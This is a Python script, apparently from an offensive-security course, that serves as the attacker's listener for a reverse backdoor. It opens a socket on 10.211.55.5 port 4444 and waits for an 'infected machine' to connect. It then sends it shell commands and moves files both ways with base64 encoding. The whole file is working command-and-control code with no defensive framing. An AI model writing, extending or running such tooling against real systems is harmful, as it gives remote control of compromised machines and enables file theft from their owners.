#!/usr/bin/env python
import socket
import json
import base64


# Program that works as a listener to catch machines with a reverse backdoor on it

class Listener:
    def __init__(self, ip, port):
        # Creating a port that will listen to cached machines
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    # Method that convert data into json object to send different kinds of files such as lists and photos

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    # Method that gets json packet that will be sent via the infected machine

    def reliable_receive(self):
        json_data = b""
        # Creating infinity loop to gather together all json packet that will come to us
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    # Method that sends terminal command to infected machine

    def execute_remotely(self, command):
        self.reliable_send(command)
        # Checking if we enter exit and close port and exit our program
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    # Method to write a file that we will get

    def write_file(self, path, content):
        # Using base64 encoding to decode any data that we encoded by base64
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successfully."

    # Method to read every file that we will send to our corrupted machine

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    # Main Method that will run our program
    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                # If we want to upload file we need to append into our command content of our file
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-]" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution"

            print(result)


my_listener = Listener("10.211.55.5", 4444)
my_listener.run()
